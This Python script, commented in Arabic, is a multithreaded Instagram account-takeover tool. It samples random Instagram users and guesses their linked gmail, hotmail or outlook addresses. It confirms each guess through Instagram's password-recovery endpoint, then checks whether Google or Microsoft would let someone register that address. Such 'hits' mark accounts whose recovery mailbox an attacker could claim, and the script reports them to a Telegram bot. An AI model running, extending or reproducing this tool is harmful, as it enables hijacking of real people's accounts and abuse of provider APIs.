# adati.py (بدل الاسم اذا تحب)
import os
import json
import time
import uuid
import re
import hashlib
import random
import string
import threading
import requests
from requests import post as pp, get
from user_agent import generate_user_agent as ggb
from bs4 import BeautifulSoup as parser
from rich.table import Table
from rich.console import Console

# ================== إعدادات من Environment ==================
TOKEN = os.getenv("TOKEN", "")   # توكن البوت (لو ترسل تلغرام)
CHAT_ID = os.getenv("ID", "")    # آي دي الشات (لو ترسل تلغرام)
THREADS = int(os.getenv("THREADS", "20"))  # عدد الثريدات (اختياري)

# ألوان للطباعة (اختياري)
green = "\033[1m\033[32m"
red = "\033[1m\033[31m"
yellow = "\033[1m\033[33m"
white = "\033[1m\033[37m"
cyan = "\033[1m\033[36m"
reset = "\033[0m"

total = 0
hit = 0
b_ig = 0
be = 0

console = Console()

# ================== تهيئة canary لميكروسوفت ==================
def get_canary():
    while True:
        try:
            res = requests.get('https://signup.live.com/signup', timeout=15)
            amsc = res.cookies.get_dict().get('amsc')
            canary = res.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
            return amsc, canary
        except Exception:
            time.sleep(1)

amsc, canary = get_canary()

# ================== أدوات عرض بسيطة ==================
def print_stats():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""{cyan}
───────────────────────────
{white}HIT   : {green}{hit}{reset}
{white}FALSE : {red}{b_ig}{reset}
{white}BAD   : {yellow}{be}{reset}
───────────────────────────
""")

# ================== فحص Gmail متاح/لا ==================
def prepare_tl():
    yy = 'azertyuiopmlkjhgfdsqwxcvbn'
    try:
        n1 = ''.join(random.choice(yy) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(yy) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(yy) for _ in range(random.randrange(15, 30)))
        he3 = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            'user-agent': ggb(),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
            headers=he3, timeout=15
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {'__Host-GAPS': host}
        headers = {
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies, headers=headers, data=data, timeout=15
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        return tl, host
    except Exception:
        return None, None

TL, HOST = prepare_tl()

def check_gmail(email):
    global be, hit
    try:
        local = email.split('@')[0] if '@' in email else email
        if not TL or not HOST:
            be += 1
            print_stats()
            return
        cookies = {'__Host-GAPS': HOST}
        headers = {
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&TL={TL}',
            'user-agent': ggb(),
        }
        params = {'TL': TL}
        data = (
            'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{TL}%22%2C%22{local}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            '&cookiesDisabled=false&flowName=GlifWebSignIn'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params, cookies=cookies, headers=headers, data=data, timeout=15
        )
        if '"gf.uar",1' in response.text:
            hit += 1
            print_stats()
            send_info(local, 'gmail.com')
        else:
            be += 1
            print_stats()
    except Exception:
        be += 1
        print_stats()

# ================== فحص مايكروسوفت (hotmail/outlook) ==================
def check_live(email):
    global hit, be
    cookies = {'amsc': amsc}
    headers = {
        'canary': canary,
        'origin': 'https://signup.live.com',
        'referer': 'https://signup.live.com/signup',
        'user-agent': ggb(),
    }
    json_data = {'signInName': email}
    try:
        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames',
            cookies=cookies, headers=headers, json=json_data, timeout=15
        ).text
        if '"isAvailable":true' in response:
            hit += 1
            print_stats()
            username, dom = email.split('@', 1)
            send_info(username, dom)
        else:
            be += 1
            print_stats()
    except Exception:
        be += 1
        print_stats()

# ================== فحص ريكفري إنستغرام ==================
def check_instagram_email(email):
    global b_ig
    ua = ggb()
    dev = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': dev,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    try:
        resp = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
                             headers=headers, data=data, timeout=15).text
        return email in resp
    except Exception:
        b_ig += 1
        print_stats()
        return False

# ================== إرسال معلومات لتلغرام (اختياري) ==================
def tg_send(text):
    if not TOKEN or not CHAT_ID:
        return
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     params={"chat_id": CHAT_ID, "text": text}, timeout=15)
    except Exception:
        pass

def rest(user):
    # تبسيط: نعيد نفس محاولة ريكفري
    ok = check_instagram_email(f"{user}@gmail.com")
    return "REST OK" if ok else "no REST"

def date_from_id(hy):
    try:
        ranges = [
            (1279000, 2010), (17750000, 2011), (279760000, 2012),
            (900990000, 2013), (1629010000, 2014), (2500000000, 2015),
            (3713668786, 2016), (5699785217, 2017), (8597939245, 2018),
            (21254029834, 2019)
        ]
        for upper, year in ranges:
            if hy <= upper: return year
        return 2023
    except Exception:
        return "none"

def send_info(username, domain):
    global total
    total += 1
    msg = f"""حساب انستا
عدد الصيد: {total}
اليوزر: @{username}
الايميل: {username}@{domain}
ريست: {rest(username)}
رابط الحساب: https://www.instagram.com/{username}
"""
    tg_send(msg)

# ================== العامل الأساسي ==================
def worker():
    # نطاقات الأرقام (بدائل لِما كان في rorc)
    bbk = 10000
    uid_max = 21254029834

    while True:
        try:
            # استعلام GraphQL للحصول على username من id عشوائي (قد يفشل كثيراً)
            data = {
                "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                "variables": json.dumps({"id": int(random.randrange(bbk, uid_max)), "render_surface": "PROFILE"}),
                "doc_id": "25618261841150840"
            }
            response = requests.post("https://www.instagram.com/api/graphql",
                                     headers={"X-FB-LSD": data["lsd"]},
                                     data=data, timeout=15)
            username = response.json().get('data', {}).get('user', {}).get('username')
            if not username:
                continue

            # جرّب 3 دومينات
            emails = [f"{username}@hotmail.com", f"{username}@gmail.com", f"{username}@outlook.com"]
            for email in emails:
                # تأكيد من انستا أنه بريد مرتبط
                if check_instagram_email(email):
                    if email.endswith("@gmail.com"):
                        check_gmail(email)
                    else:
                        check_live(email)
        except Exception:
            # تجاهل واستمر
            pass

# تشغيل عدّة خيوط
def main():
    print_stats()
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    # منع الخروج
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
